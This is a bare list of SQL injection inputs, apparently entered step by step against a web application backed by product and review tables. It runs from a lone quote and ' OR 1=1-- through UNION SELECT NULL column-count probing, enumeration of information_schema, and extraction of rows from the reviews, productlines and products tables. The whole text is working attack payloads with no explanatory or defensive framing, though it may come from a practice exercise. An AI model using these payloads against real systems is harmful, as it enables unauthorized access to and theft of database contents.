1
'
' OR 1=1-- 
' UNION SELECT NULL FROM information_schema.columns-- 
' UNION SELECT NULL, NULL FROM information_schema.columns-- 
' UNION SELECT NULL, NULL, NULL FROM information_schema.columns-- 
' UNION SELECT table_name, NULL, NULL FROM information_schema.columns-- 
' UNION SELECT table_name, NULL, NULL FROM information_schema.columns-- 
' UNION SELECT table_name, column_name, NULL FROM information_schema.columns-- 
' UNION SELECT name, review, NULL FROM reviews-- 
' UNION SELECT productCode, NULL, NULL FROM reviews-- 
' UNION SELECT name, productCode, NULL FROM reviews-- 
' UNION SELECT productLine, textDescription, NULL FROM productlines-- 
' UNION SELECT image, NULL, NULL FROM productlines-- 
' UNION SELECT productCode, productName, NULL FROM products-- 
' UNION SELECT productLine, productScale, NULL FROM products-- 
' UNION SELECT productVendor, productDescription, NULL FROM products-- 
' UNION SELECT quantityInStock, buyPrice, NULL FROM products-- 
' UNION SELECT MSRP, NULL, NULL FROM products-- 
' UNION SELECT column_name, data_type, NULL FROM information_schema.columns-- 
